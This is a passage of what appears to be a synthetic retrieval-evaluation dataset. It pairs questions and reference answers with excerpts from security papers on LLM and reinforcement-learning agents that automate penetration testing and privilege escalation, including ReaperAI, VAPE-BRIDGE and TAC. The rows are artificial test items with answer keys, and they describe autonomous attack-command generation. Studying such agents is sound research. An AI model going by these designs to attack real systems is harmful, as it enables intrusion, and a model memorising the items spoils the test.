ReaperAI\ndemonstrates the potential to identify, exploit, and analyze security\nvulnerabilities autonomously.\n  This research outlines the core methodologies that can be utilized to\nincrease consistency and performance, including task-driven penetration testing\nframeworks, AI-driven command generation, and advanced prompting techniques.\nThe AI agent operates within a structured environment using Python, enhanced by\nRetrieval Augmented Generation (RAG) for contextual understanding and memory\nretention. ReaperAI was tested on platforms including, Hack The Box, where it\nsuccessfully exploited known vulnerabilities, demonstrating its potential\npower.\n  However, the deployment of AI in offensive security presents significant\nethical and operational challenges. The agent's development process revealed\ncomplexities in command execution, error handling, and maintaining ethical\nconstraints, highlighting areas for future enhancement.\n  This study contributes to the discussion on AI's role in cybersecurity by\nshowcasing how AI can augment offensive security strategies. It also proposes\nfuture research directions, including the refinement of AI interactions with\ncybersecurity tools, enhancement of learning mechanisms, and the discussion of\nethical guidelines for AI in offensive roles. The findings advocate for a\nunique approach to AI implementation in cybersecurity, emphasizing innovation."", 'entry_id': 'http://arxiv.org/abs/2406.07561v1', 'published_first_time': '2024-05-09', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2406.07561v1', 'http://arxiv.org/pdf/2406.07561v1']}]",True
How does the context size limiter save costs with LLMs?,"[' system, deploy vulnerabilities\nupdate system, deploy vulnerabilities\nreturn ""running VMs with Vulns""\nsystem output\nreturn database with run data\nText\ndestroy VMs\nStart Priv-Esc for each VM\nFigure 2: Typical benchmark flow including VM creation, provisioning, testing, and tear-down.\nwintermute\nVM\ncmd\ncmd result\ncmd\nLLM-Prompt:\nnext-command\nhistory\ncmd + result\nhistory\nstate\ncmd + result\nnew state\nLLM-Prompt:\nupdate-state\nstate\nstate\nhint\nsingle VM hint\nFigure 3: Relationship between prompts and stored data.\nSelected LLMs. We selected OpenAI’s GPT-3.5-turbo and GPT-4 as\nexamples of cloud-based LLMs. Both are easily available and were\nthe vanguard of the recent LLM-hype. We would have preferred to\ninclude Anthropic’s Claude2 or Google’s Palm2 models but those\nare currently unavailable within the EU.\nWe included two Llama2-70b variants in our evaluation as ex-\namples of locally run LLMs. Both Upstage-Llama2-70b Q5 and Sta-\nbleBeluga2 GGUF are fine-tuned LLama2-70b variants that scored\nhigh on HuggingFace’s Open LLM leaderboard [18] which is based\non comprehension tests.\nWe designated two selection criteria for inclusion in quantitative\nanalysis: first, there must be at least one single successful exploit\nduring a run, and second, at least 90% of the runs must either reach\nthe configured round limit (20 rounds) or end with a successful\nprivilege-escalation. None of the locally run LLMs achieved this,\nthus their results are only used within the qualitative analysis in\nSection 6.\nUnifying Context-Size. We have implemented a context size lim-\niter within our prototype to better allow comparison of different\nmodels. As the context size is directly related to the used token\ncount, and the token count is directly related to the occurring costs,\nreducing the context size would also reduce the cost of using LLMs.\nWe started with a context size of 4096, reduced by a small safety\nmargin of 128 tokens. When testing for larger context sizes, we\nutilize GPT-3.5-turbo-16k with it’s 16k context-size as well as GPT-4\nwith its 8192 context size. While GPT-4 is also documented to have\na 32k context size, this was not available within the EU during\nevaluation.\nWe benchmark each model using the four scenarios described in\nSection 4.2.2 and shown in Figure 3. Additionally, we evaluate the\nimpact of using high-level hints.\n5.1\nFeasibility of LLMs for Priv-Esc\nWe initially analyze the different tested model families and then\nanalyze the different vulnerability classes. The overall results can\nbe seen in Table 2.\nFeasibility of Different Models. GPT-4 is well suited for detecting\nfile-based exploits as it can typically solve 75-100% of test-cases\nof that vulnerability class. GPT-3.5-turbo did fare worse with only\nbeing able to solve 25–50% of those. Round numbers indicate that\ninformation-disclosure based vulnerabilities were found “later” than\nfile-based ones, implying that LLMs tested for them later. Only GPT-\n4 was able to exploit multi-step vulnerabilities like the cron-based\ntest-cases. As mentioned before, none of the locally-run LLMs were\nable to meet the cut-off criteria.\nFeasibility of Vulnerability Classes. Looking from the vulner-\nability class perspective: file-based exploits were well handled,\ninformation-disclosure based exploits needed directing LLMs to that\narea, and multi-step cron attacks are hard for LLMs. One surprise\nwas that only GPT-4 was only once able to detect the root-password\nstored in vacation.txt placed in the user’s home directory.\nLLMs as Hackers: Autonomous Linux Privilege Escalation Attacks\nTable 2: Hacking Benchmark Results of LLMs.\nModel\nCtx. Size\nHints\nHistory\nState\nsuid-gtfo\nsudo-all\nsudo-gtfo\ndocker\npassword reuse\nweak password\npassword in file\nbash_history\nSSH key\ncron\ncron-wildcard\ncron/visible\ncron-wildcard/visible\n% solved\nupstart-llama2\n4096\n-\n-\n-\n-\n✓14\n-']","The context size limiter saves costs with LLMs by reducing the context size, which is directly related to the used token count. Since the token count is directly related to the occurring costs, reducing the context size would also reduce the cost of using LLMs.",reasoning,"[{'Published': '2024-03-19', 'Title': 'LLMs as Hackers: Autonomous Linux Privilege Escalation Attacks', 'Authors': 'Andreas Happe, Aaron Kaplan, Jürgen Cito', 'Summary': 'Penetration testing, an essential component of software security testing,\nallows organizations to proactively identify and remediate vulnerabilities in\ntheir systems, thus bolstering their defense mechanisms against potential\ncyberattacks. One recent advancement in the realm of penetration testing is the\nutilization of Language Models (LLMs).\n  We explore the intersection of LLMs and penetration testing to gain insight\ninto their capabilities and challenges in the context of privilege escalation.\nWe create an automated Linux privilege-escalation benchmark utilizing local\nvirtual machines. We introduce an LLM-guided privilege-escalation tool designed\nfor evaluating different LLMs and prompt strategies against our benchmark.\n  Our results show that GPT-4 is well suited for detecting file-based exploits\nas it can typically solve 75-100\\% of test-cases of that vulnerability class.\nGPT-3.5-turbo was only able to solve 25-50% of those, while local models, such\nas Llama2 were not able to detect any exploits. We analyze the impact of\ndifferent prompt designs, the benefits of in-context learning, and the\nadvantages of offering high-level guidance to LLMs. We discuss challenging\nareas for LLMs, including maintaining focus during testing, coping with errors,\nand finally comparing them with both stochastic parrots as well as with human\nhackers.', 'entry_id': 'http://arxiv.org/abs/2310.11409v3', 'published_first_time': '2023-10-17', 'comment': '11 pages', 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2310.11409v3', 'http://arxiv.org/pdf/2310.11409v3']}]",True
How can Large Language Models (LLMs) be leveraged to develop a fully autonomous offensive security agent?,"['ARTIFICIAL INTELLIGENCE AS THE NEW HACKER:\nDEVELOPING AGENTS FOR OFFENSIVE SECURITY\nby\nLeroy Jacob Valencia\nSubmitted in Partial Fulfillment\nof the Requirements for the Degree of\nMasters of Science in Transdiciplinary Cybersecurity\nNew Mexico Institute of Mining and Technology\nSocorro, New Mexico\nMay, 2024\narXiv:2406.07561v1  [cs.CR]  9 May 2024\nThis work is dedicated to my wife, whose unwavering support and belief in my\npotential have been my constant source of strength and inspiration.\nLeroy Jacob Valencia\nNew Mexico Institute of Mining and Technology\nMay, 2024\nACKNOWLEDGMENTS\nI wish to extend my sincerest gratitude to Danny Quist PhD., whose insights\nand guidance were invaluable throughout this research. We also appreciate the\nsupport provided by New Mexico Cybersecurity Center of Excellence. Lastly, I\nwant to thank my peers and family members for their encouragement.\nThis report was typeset with L\nAT\nEX1 by the author.\n1The L\nAT\nEX document preparation system was developed by Leslie Lamport as a special ver-\nsion of Donald Knuth’s T\nEX program for computer typesetting. T\nEX is a trademark of the Ameri-\ncan Mathematical Society. The L\nA\nT\nEX macro package for the New Mexico Institute of Mining and\nTechnology report format was written by John W. Shipman.\niii\nABSTRACT\nIn the vast domain of cybersecurity, the transition from reactive defense to\noffensive has become critical in protecting digital infrastructures. This paper ex-\nplores the integration of Artificial Intelligence (AI) into offensive cybersecurity,\nparticularly through the development of an autonomous AI agent, ReaperAI, de-\nsigned to simulate and execute cyberattacks. Leveraging the capabilities of Large\nLanguage Models (LLMs) such as GPT-4, ReaperAI demonstrates the potential to\nidentify, exploit, and analyze security vulnerabilities autonomously.\nThis research outlines the core methodologies that can be utilized to increase\nconsistency and performance, including task-driven penetration testing frame-\nworks, AI-driven command generation, and advanced prompting techniques.\nThe AI agent operates within a structured environment using Python, enhanced\nby Retrieval Augmented Generation (RAG) for contextual understanding and\nmemory retention. ReaperAI was tested on platforms including, Hack The Box,\nwhere it successfully exploited known vulnerabilities, demonstrating its poten-\ntial power.\nHowever, the deployment of AI in offensive security presents significant eth-\nical and operational challenges. The agent’s development process revealed com-\nplexities in command execution, error handling, and maintaining ethical con-\nstraints, highlighting areas for future enhancement.\nThis study contributes to the discussion on AI’s role in cybersecurity by\nshowcasing how AI can augment offensive security strategies. It also proposes\nfuture research directions, including the refinement of AI interactions with cy-\nbersecurity tools, enhancement of learning mechanisms, and the discussion of\nethical guidelines for AI in offensive roles. The findings advocate for a unique\napproach to AI implementation in cybersecurity, emphasizing innovation.\nKeywords: Artificial Intelligence, Offensive Cybersecurity, Large Language Mod-\nels, Penetration Testing\nCONTENTS\nPage\nLIST OF TABLES\nviii\nLIST OF FIGURES\nix\nCHAPTER 1.\nINTRODUCTION\n1\n1.1\nProblem Statement . . . . . . . . . . . . . . . . . . . . . . . . . . . .\n1\n1.2\nImpact\n. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . .\n2\nCHAPTER 2.\nBACKGROUND AND LITERATURE REVIEW\n3\n2.1\nEvolution of Offensive Security . . . . . . . . . . . . . . . . . . . . .\n3\n2.2\nEvolution of Large Language Models . . . . . . . . . . . . . . . . . .\n3\n2.3\nAI in Cybersecurity: A Historical Perspective . . . . . . . . . . . . .\n4\n2.4\nReview of Current AI in Offensive Security . . . . . . . . . . . . . .\n4\n2.4.1\nPentestGPT . . . . . . . . . . . . . . . . . . . . . . . . . . . .\n5\n2.4.2\nHackingbuddyGPT . . . . . . . . . .']","Large Language Models (LLMs) such as GPT-4 can be leveraged to develop a fully autonomous offensive security agent by integrating them into the agent's framework to simulate and execute cyberattacks. The AI agent, like ReaperAI, can utilize task-driven penetration testing frameworks, AI-driven command generation, and advanced prompting techniques. Additionally, the agent can operate within a structured environment using Python, enhanced by Retrieval Augmented Generation (RAG) for contextual understanding and memory retention.",simple,"[{'Published': '2024-05-09', 'Title': 'Artificial Intelligence as the New Hacker: Developing Agents for Offensive Security', 'Authors': 'Leroy Jacob Valencia', 'Summary': ""In the vast domain of cybersecurity, the transition from reactive defense to\noffensive has become critical in protecting digital infrastructures. This paper\nexplores the integration of Artificial Intelligence (AI) into offensive\ncybersecurity, particularly through the development of an autonomous AI agent,\nReaperAI, designed to simulate and execute cyberattacks. Leveraging the\ncapabilities of Large Language Models (LLMs) such as GPT-4, ReaperAI\ndemonstrates the potential to identify, exploit, and analyze security\nvulnerabilities autonomously.\n  This research outlines the core methodologies that can be utilized to\nincrease consistency and performance, including task-driven penetration testing\nframeworks, AI-driven command generation, and advanced prompting techniques.\nThe AI agent operates within a structured environment using Python, enhanced by\nRetrieval Augmented Generation (RAG) for contextual understanding and memory\nretention. ReaperAI was tested on platforms including, Hack The Box, where it\nsuccessfully exploited known vulnerabilities, demonstrating its potential\npower.\n  However, the deployment of AI in offensive security presents significant\nethical and operational challenges. The agent's development process revealed\ncomplexities in command execution, error handling, and maintaining ethical\nconstraints, highlighting areas for future enhancement.\n  This study contributes to the discussion on AI's role in cybersecurity by\nshowcasing how AI can augment offensive security strategies. It also proposes\nfuture research directions, including the refinement of AI interactions with\ncybersecurity tools, enhancement of learning mechanisms, and the discussion of\nethical guidelines for AI in offensive roles. The findings advocate for a\nunique approach to AI implementation in cybersecurity, emphasizing innovation."", 'entry_id': 'http://arxiv.org/abs/2406.07561v1', 'published_first_time': '2024-05-09', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2406.07561v1', 'http://arxiv.org/pdf/2406.07561v1']}]",True
How does VAPE-BRIDGE facilitate the integration between OpenVAS and Metasploit for vulnerability assessment and penetration testing?,"[' TAMELESS can analyse threats, verify security\nproperties, and produce graphical outputs of its analyses, thereby assisting security architects in identifying\noptimal prevention and mitigation solutions.\nThe efficiency and applicability of TAMELESS have been\ndemonstrated through case study evaluations involving unauthorised access to safe boxes, web servers, and\nwind farms, showcasing its effectiveness in real-world scenarios.\nAppendix C.85. TChecker: Precise Static Inter-Procedural Analysis for Detecting Taint-Style Vulnerabilities\nin PHP Applications\nTChecker (2022, Luo et al. [135]) introduces a context-sensitive inter-procedural static taint analysis\ntool specifically tailored for PHP applications, addressing the challenge of taint-style vulnerabilities like SQL\ninjection and cross-site scripting.\nBy modelling PHP objects and dynamic language features, TChecker\nconducts iterative data-flow analysis to refine object types and accurately identify call targets. Comprehens-\nive evaluations across diverse modern PHP applications showcased TChecker’s effectiveness, discovering 18\npreviously unknown vulnerabilities while outperforming existing static analysis tools in vulnerability detec-\ntion. It not only detected more vulnerabilities but also maintained a relatively good precision, surpassing\ncompetitors while releasing its source code to foster further research in this domain.\nAppendix C.86. Detecting and exploiting second order denial-of-service vulnerabilities in web applications\nTORPEDO (2015, Olivo et al. [136]) is a second-order vulnerability scanning tool that detects Denial of\nService (DoS), Cross-Site Scripting (XSS), and SQL Injection. The program searches for two-phased DoS\nattacks that work by polluting a database with junk entries and resource exhaustion. When applied to six\nhighly used web apps, it detected thirty-seven vulnerabilities and eighteen false positives.\nAppendix C.87. UE Security Reloaded: Developing a 5G Standalone User-Side Security Testing Framework\nUE Security Reloaded (2023, Hoang et al. [137]) is an open-source security testing framework specific-\nally developed for 5G Standalone (SA) User Equipment (UE). This tool enhances existing open-source suites\n(Open5GS and srsRAN) by creating an extensive range of test cases for both the 5G Non-Access Stratum\n(NAS) and Radio Resource Control (RRC) layers. Such an approach offers in-depth insights through exper-\niments on 5G SA mobile phones. The framework allows for the transmission of 5G control-plane messages\n(NAS and RRC) to a UE and facilitates the modification of these messages to examine the UE’s reactions\nunder a variety of conditions.\nAppendix C.88. Untangle: Aiding Global Function Pointer Hijacking for Post-CET Binary Exploitation\nUntangle (2023, Bertani et al. [138]) is a tool that exploit global function pointer hijacking in order\nto defeat Intel’s Control-Flow Enforcement Technology (CET) The method combines symbolic execution\nand static code analysis to identify global function pointers within C libraries, which, when compromised,\nfacilitate control-flow hijacking attacks. Experimental results demonstrated the effectiveness of Untangle in\nidentifying global function pointers across eight widely used open-source C libraries.\nAppendix C.89. VAPE-BRIDGE: Bridging OpenVAS Results for Automating Metasploit Framework\nVAPE-BRIDGE (2022, Vimala et al. [139]) is a tool designed to streamline the transition between vulner-\nability assessment (VA) and penetration testing (PenTest) processes by automating the conversion of scan\nresults from the Open Vulnerability Assessment Scanner (OpenVAS) into executable scripts for the Metas-\nploit Framework. The VAPE-BRIDGE system comprises three main components: Scan result extraction,\nresponsible for parsing the VA scan results from OpenVAS; Target list repository, accountable for maintain-\ning a database of identified vulnerabilities to be used in the PenTest process; and the Automated shell scripts\nexploitation, which generates shell scripts based on the extracted vulnerabilities, which are then executed\nwithin Metasploit to simulate attacks and test the system’s resilience.\n47\nAppendix C.90. Vera: A flexible model-based vulnerability testing tool\nVERA (2013, Blome et al. [140]) is an automated tool that supports Penetration Testers to define attacker\nmodels (separating payloads and behaviour) using state machines for vulnerability analysis in web applica-\ntions. The models acquired are then converted into libraries for specific vulnerability targeting. The tool is\nhighly flexible with the availability to expand and integrate custom libraries to enhance functionality.\nAppendix C.91. V']","VAPE-BRIDGE facilitates the integration between OpenVAS and Metasploit for vulnerability assessment and penetration testing by automating the conversion of scan results from OpenVAS into executable scripts for the Metasploit Framework. The system comprises three main components: Scan result extraction, responsible for parsing the VA scan results from OpenVAS; Target list repository, accountable for maintaining a database of identified vulnerabilities to be used in the PenTest process; and the Automated shell scripts exploitation, which generates shell scripts based on the extracted vulnerabilities, which are then executed within Metasploit to simulate attacks and test the system’s resilience.",simple,"[{'Published': '2024-07-19', 'Title': 'Bridging the Gap: A Survey and Classification of Research-Informed Ethical Hacking Tools', 'Authors': 'Paolo Modesti, Lewis Golightly, Louis Holmes, Chidimma Opara, Marco Moscini', 'Summary': ""The majority of Ethical Hacking (EH) tools utilised in penetration testing\nare developed by practitioners within the industry or underground communities.\nSimilarly, academic researchers have also contributed to developing security\ntools. However, there appears to be limited awareness among practitioners of\nacademic contributions in this domain, creating a significant gap between\nindustry and academia's contributions to EH tools. This research paper aims to\nsurvey the current state of EH academic research, primarily focusing on\nresearch-informed security tools. We categorise these tools into process-based\nframeworks (such as PTES and Mitre ATT\\&CK) and knowledge-based frameworks\n(such as CyBOK and ACM CCS). This classification provides a comprehensive\noverview of novel, research-informed tools, considering their functionality and\napplication areas. The analysis covers licensing, release dates, source code\navailability, development activity, and peer review status, providing valuable\ninsights into the current state of research in this field."", 'entry_id': 'http://arxiv.org/abs/2407.14255v1', 'published_first_time': '2024-07-19', 'comment': 'This is the extended version of the paper published in the Journal of\n  Cybersecurity and Privacy, 4, no. 3: pp 410-448, 2024', 'journal_ref': 'Volume 4, Issue 3: pp 410-448, 2024', 'doi': '10.3390/jcp4030021', 'primary_category': 'cs.CR', 'categories': ['cs.CR'], 'links': ['http://dx.doi.org/10.3390/jcp4030021', 'http://arxiv.org/abs/2407.14255v1', 'http://arxiv.org/pdf/2407.14255v1']}]",True
How does AI-driven command generation enhance the efficiency and accuracy of penetration testing?,"['Figure 4.2: Example Task Tree\n4.4.2\nDynamic Task Updates\nThe dynamic nature of security environments requires an equally agile re-\nsponse during penetration testing, which the ReaperAI addresses through real-\ntime updates to tasks based on outcomes and feedback from the Large Language\nModel. As the penetration testing progresses, each action’s result is analyzed\nand the subsequent tasks are generated based on the previous collection of in-\nformation. This adaptive method allows the testing process to remain flexible\n22\nand responsive, accommodating changes and unexpected results as they occur.\nFor instance, if an expected vulnerability is not found, the task tree won’t in-\nclude any of the vulnerabilities-centric paths in order to prevent tangential rabbit\nholes. Similarly, successful exploitation might lead to additional tasks focusing\non deeper system analysis or cleanup. This real-time feedback loop ensures that\nthe penetration testing is not only thorough but also maximally efficient, adapt-\ning on-the-fly to findings and shifting priorities without losing momentum. The\nactual workflow is represented in Figure4.3.\nFigure 4.3: Decision Making on Tasks\n4.5\nAI-Driven Command Generation and Processing\n4.5.1\nWorkflow\nIn Figure 4.4 which shows the workflow for the main command generation\nprocess of the agent. The process begins with initializing the program by con-\nnecting to and retrieving it from the LLM. Next, the size determinations are made\nby fetching the current state size using get state size and determining the tem-\nplate size with num tokens from string, based on a source template to ensure\ntoken requirements aren’t being exceeded. Following size determinations, the\ncommand history is retrieved through the get cmd history v3 function, which\ncombines the state size, template size, and other relevant parameters from the\n23\ndatabase and memory of the wrapper. A text prompt for the LLM is then gener-\nated using create and ask prompt text, incorporating all necessary parameters\nsuch as history, state, target, constraints, current task, current role, task tree, and\ndetails of the analysis.\nOnce the LLM has processed the prompt, the output\nis cleaned using command output cleaner to ensure the response doesn’t have\nresidual artifacts included by the LLM like $ or bash. Finally, the process con-\ncludes with returning the cleaned response, completing the interaction cycle with\nthe LLM.\nFigure 4.4: Get Next Command Workflow\n4.5.2\nIntegration with LLM\nThe program capitalizes on the advanced capabilities of LLMs by establish-\ning a connection to an LLM server, using an API key. There are financial costs\nto using OpenAI’s API, which are priced by the million tokens due to its closed\nsource subscription model. These costs are not too expensive, but are important\nfactors to consider when discussing the capabilities of an offensive agent. This\nintegration is crucial, however, as it harnesses the AI’s ability to generate and\nprocess commands based on vast datasets it was trained on. By utilizing AI to\ngenerate actionable commands and interpret outputs through the use of com-\nmon communication protocol, REST API, the program reduces the manual effort\nrequired in formulating commands and speeds up the testing process. This au-\ntomation not only increases the autonomous nature of the tests but also enhances\ntheir accuracy by leveraging the LLM’s easily available communication interface.\nThe AI’s input helps ensure that the commands are both contextually relevant\nand highly optimized for the tasks at hand, thereby streamlining the workflow\nduring penetration testing.\nIn ReaperAI, the idea from Happe’s project was to create a class for the LLM\nto ensure that the state and other functions and constants would stay contained\n24\nFigure 4.5: LLM Object\nin it shown in Figure4.5 This implementation of standard class/object behavior,\ncommon in most programming languages, was chosen as the most suitable for\nthe desired functionality of the LLM.\n4.5.3\nStateful Interaction\nTo ensure the continuity and relevance of interactions within the dynamic\nenvironment of penetration testing, the script maintains a stateful interaction\nwith the LLM. This approach helps preserve the context of the penetration test\nacross different interactions with the system, a critical aspect for maintaining the\naccuracy and relevance of AI-generated suggestions. By keeping track of previ-\nous commands and responses, the stateful system can provide contextually ap-\npropriate suggestions that build on earlier actions, thereby avoiding redundant\nor irrelevant commands.\nAnalysis is crucial both for the large language model and the human over-\nseeing it. By providing a summary at each main step of the workflow, as seen in']","AI-driven command generation enhances the efficiency and accuracy of penetration testing by automating the formulation of commands and speeding up the testing process. It leverages the AI's ability to generate actionable commands and interpret outputs, reducing manual effort and ensuring commands are contextually relevant and highly optimized for the tasks at hand. This automation increases the autonomous nature of the tests and enhances their accuracy.",simple,"[{'Published': '2024-05-09', 'Title': 'Artificial Intelligence as the New Hacker: Developing Agents for Offensive Security', 'Authors': 'Leroy Jacob Valencia', 'Summary': ""In the vast domain of cybersecurity, the transition from reactive defense to\noffensive has become critical in protecting digital infrastructures. This paper\nexplores the integration of Artificial Intelligence (AI) into offensive\ncybersecurity, particularly through the development of an autonomous AI agent,\nReaperAI, designed to simulate and execute cyberattacks. Leveraging the\ncapabilities of Large Language Models (LLMs) such as GPT-4, ReaperAI\ndemonstrates the potential to identify, exploit, and analyze security\nvulnerabilities autonomously.\n  This research outlines the core methodologies that can be utilized to\nincrease consistency and performance, including task-driven penetration testing\nframeworks, AI-driven command generation, and advanced prompting techniques.\nThe AI agent operates within a structured environment using Python, enhanced by\nRetrieval Augmented Generation (RAG) for contextual understanding and memory\nretention. ReaperAI was tested on platforms including, Hack The Box, where it\nsuccessfully exploited known vulnerabilities, demonstrating its potential\npower.\n  However, the deployment of AI in offensive security presents significant\nethical and operational challenges. The agent's development process revealed\ncomplexities in command execution, error handling, and maintaining ethical\nconstraints, highlighting areas for future enhancement.\n  This study contributes to the discussion on AI's role in cybersecurity by\nshowcasing how AI can augment offensive security strategies. It also proposes\nfuture research directions, including the refinement of AI interactions with\ncybersecurity tools, enhancement of learning mechanisms, and the discussion of\nethical guidelines for AI in offensive roles. The findings advocate for a\nunique approach to AI implementation in cybersecurity, emphasizing innovation."", 'entry_id': 'http://arxiv.org/abs/2406.07561v1', 'published_first_time': '2024-05-09', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.CR', 'categories': ['cs.CR', 'cs.AI'], 'links': ['http://arxiv.org/abs/2406.07561v1', 'http://arxiv.org/pdf/2406.07561v1']}]",True
How does the DRLRM-PT framework utilize cybersecurity domain knowledge in training PT policies?,"[' the DQN agents. Specifically, the average number\nof steps taken during the training phase for DQRM-RM1 and DQRM-RM2 is 186.13 and 104.48, respectively, which\nis approximately half the number of steps taken by the two DQN agents (374.71 and 218.39, respectively).\nIn Figure 7, the x-axis is the logarithmic scale of the step. The trained PT policies of DQRM-RM1, DQRM-RM2, and\nDQN-RM1 in env-1 can achieve higher accumulative rewards in around 50 steps compared to DQN-RM2. DQRM-\nRM1 and DQRM-RM2 exhibit similar levels of performance, both of which outperform DQN-RM1. On the right\nside of Figure 8, it can also be observed that DQRM-RM1, DQRM-RM2, and DQN-RM1 can capture the flag using\na limited number of steps, which means that their policies are well trained. However, the number of steps in DQN-\nRM2 has a great variance. Finally, the average number of steps for DQRM-RM1, DQRM-RM2, and DQN-RM1 is\n23.48, 21.32, and 29.76, respectively. The average number of steps for DQN-RM2 is 767.46, which reflects poor PT\nperformance.\nIn env-2, DQRM agents also show improved training efficiency and evaluation performance according to Figure 9.\nOn the left side of Figure 9, the median values of the steps of DQRM-RM1 (225) and DQRM-RM2 (235) outperform\nDQN-RM1 (310) and DQN-RM2 (276), respectively. On the right side of Figure 9, the median value of the steps of\nDQRM-RM2 (211) is shorter than DQN-RM2 (305), which means it has better evaluation performance. Similarly,\nDQRM-RM1 (206) also has better evaluation performance than DQN-RM1 (336).\nFrom the previous analysis, we can answer RQ1 that RMs can help the agent learn PT policies faster in different\nenvironments.\n5.2.2\nComparison between different RMs\nTo answer RQ2, we compare the PT performance between DQRM-RM1 and DQRM-RM2 in env-1 and env-2, respec-\ntively.\nFrom Figure 6, DQRM-RM2 demonstrates better training efficiency compared to DQRM-RM1 in env-1. We can see\nthat after approximately 80 steps, DQRM-RM2 achieves an average accumulated reward of approximately 15, whereas\nDQRM-RM1 achieves around 10.\nFrom the left side of Figure 8, the DQRM-RM2 agent requires fewer steps to capture two flags in most episodes\ncompared to the DQRM-RM1 agent in env-1. Specifically, the average number of steps taken during the training\nphase for DQRM-RM1 is 186.13, which is 78% higher than DQRM-RM2.\nFrom the right side of Figure 8, the average number of attack steps used by DQRM-RM1 and DQRM-RM2 are 23.48\nand 21.32, respectively, indicating that DQRM-RM2’s PT performance is better than DQRM-RM1 in env-1.\nTraining phase\nEvaluation phase\nFigure 9: The attack steps of four agents in env-2.\nFrom the left side of Figure 9, DQRM-RM2 shows fewer average steps (290.85) compared to DQRM-RM1 (302.01)\nin env-2, which means DQRM-RM2 has better training efficiency than DQRM-RM1. On the right side of Figure 9,\nDQRM-RM2 has better evaluation performance since DQRM-RM2 takes an average of 295.48 steps, which is fewer\nthan DQRM-RM1 (329.34).\nBased on the previous analysis, we can conclude that the PT performance of agents guided by R2 is more effective\nthan R1 in different environments since it involves an additional subtask, i.e., discovering new nodes, which is more\ndetailed than R1.\n6\nConclusion and Future Works\nIn this work, we proposed a knowledge-informed AutoPT framework called DRLRM-PT. This framework utilizes\nRMs to embed domain knowledge from the field of cybersecurity, which serves as guidelines for training PT policies.\nWe took']","The DRLRM-PT framework utilizes RMs to embed domain knowledge from the field of cybersecurity, which serves as guidelines for training PT policies.",simple,"[{'Published': '2024-05-24', 'Title': 'Knowledge-Informed Auto-Penetration Testing Based on Reinforcement Learning with Reward Machine', 'Authors': 'Yuanliang Li, Hanzheng Dai, Jun Yan', 'Summary': 'Automated penetration testing (AutoPT) based on reinforcement learning (RL)\nhas proven its ability to improve the efficiency of vulnerability\nidentification in information systems. However, RL-based PT encounters several\nchallenges, including poor sampling efficiency, intricate reward specification,\nand limited interpretability. To address these issues, we propose a\nknowledge-informed AutoPT framework called DRLRM-PT, which leverages reward\nmachines (RMs) to encode domain knowledge as guidelines for training a PT\npolicy. In our study, we specifically focus on lateral movement as a PT case\nstudy and formulate it as a partially observable Markov decision process\n(POMDP) guided by RMs. We design two RMs based on the MITRE ATT\\&CK knowledge\nbase for lateral movement. To solve the POMDP and optimize the PT policy, we\nemploy the deep Q-learning algorithm with RM (DQRM). The experimental results\ndemonstrate that the DQRM agent exhibits higher training efficiency in PT\ncompared to agents without knowledge embedding. Moreover, RMs encoding more\ndetailed domain knowledge demonstrated better PT performance compared to RMs\nwith simpler knowledge.', 'entry_id': 'http://arxiv.org/abs/2405.15908v1', 'published_first_time': '2024-05-24', 'comment': None, 'journal_ref': None, 'doi': None, 'primary_category': 'cs.AI', 'categories': ['cs.AI', 'cs.CR', 'cs.LG'], 'links': ['http://arxiv.org/abs/2405.15908v1', 'http://arxiv.org/pdf/2405.15908v1']}]",True
How does TAC's whitebox vs. greybox compare in PE detection?,"['box variants of TAC,\neach of which employs a different pretraining strategy or query model.\nAs a result, on the synthesized IAM PE task set by IAMVulGen, TAC’s whitebox variant successfully\ndetected all PEs, and significantly outperforms all three state-of-the-art whitebox baselines, showing\nthe outstanding effectiveness of our IAM modeling. In addition, given a query budget of 100,\nTAC identifies 6% to 38% more PEs with 16% to 23% fewer queries on average than all its three\ngreybox variants, demonstrating the superiority of our pretraining based deep RL approach. On\nthe only publicly available task set IAM Vulnerable [1], TAC is able to detect 23 PEs under a query\nbudget of 10, and all 31 PEs with a query budget of 20, which substantially outperforms all three\nwhitebox baselines. Furthermore, TAC successfully detects two real-world PEs with a query budget\nof 60. The contributions of this paper are:\n• Modeling. A comprehensive modeling for IAM configurations is introduced, providing the\nfoundation of IAM PE detection.\n• Approach. TAC is the first interactive greybox penetration testing tool for third-party cloud\nsecurity services to detect PEs due to IAM misconfigurations.\n• Synthetic Data. An IAM PE task generator called IAMVulGen is proposed.\n2\nBACKGROUND\n2.1\nRL Basics\nRL refers to a set of algorithms that aim to learn to make decisions from interactions [57]. An RL\nproblem is usually formulated as a Markov Decision Process (MDP). In MDP, the learner or the\ndecision maker is called the RL agent. The RL agent interacts with the environment which maintains\nits internal state. In each interaction between the RL agent and the environment, the RL agent\nchooses an action to perform; the environment then updates its state based on the action, and\nreturns a reward quantifying the effectiveness of the action.\nIn this paper, we only consider a finite sequence of interactions between the RL agent and the\nenvironment, which are divided into several sub-sequences, namely episodes. Each episode starts\nfrom an initial state and ends with a terminal state. If an episode ends, the state of the environment\nwill be automatically reset to the initial state for the next episode to start. The return refers to the\ncumulative rewards for one episode. The goal of the RL agent is to learn an RL policy for choosing\nan action per interaction that maximizes the expected return.\n2.2\nIAM Basics\n2.2.1\nIAM Configurations. IAM configuration consists of two components: entities and permissions.\nAn entity represents either a subject or a role in an IAM configuration. Subjects (i.e., users, user\ngroups and services) can actively perform actions. Roles are created to represent job functions and\nresponsibilities within an organization. Permissions refer to privileges of performing operations. An\nentity in an IAM configuration can obtain permissions in both direct and indirect ways. Permissions\ncan be directly assigned to users, user groups and roles; permissions assigned to an entity can be\nindirectly assigned to another entity in many ways, depending on the relationship between the\ntwo entities. For example, all permissions assigned to a user group can be indirectly assigned to a\nuser in the user group; all permissions assigned to a role can be indirectly assigned to a user who\nassumes the role (i.e., become a member of the role).\n4\nYang Hu, Wenxi Wang, Sarfraz Khurshid, and Mohit Tiwari\nUser 1\nUser 2\nPerm 1\nPerm 2\nPerm 3\nPermissions\nService 1\nRole 1\nRole 2\nGroup 1\nEntities\n(a) Original configuration.\nUser 1\nUser 2\nPerm 1\nPerm 2\nPerm 3\nPermissions\nService 1\nRole 1\nRole 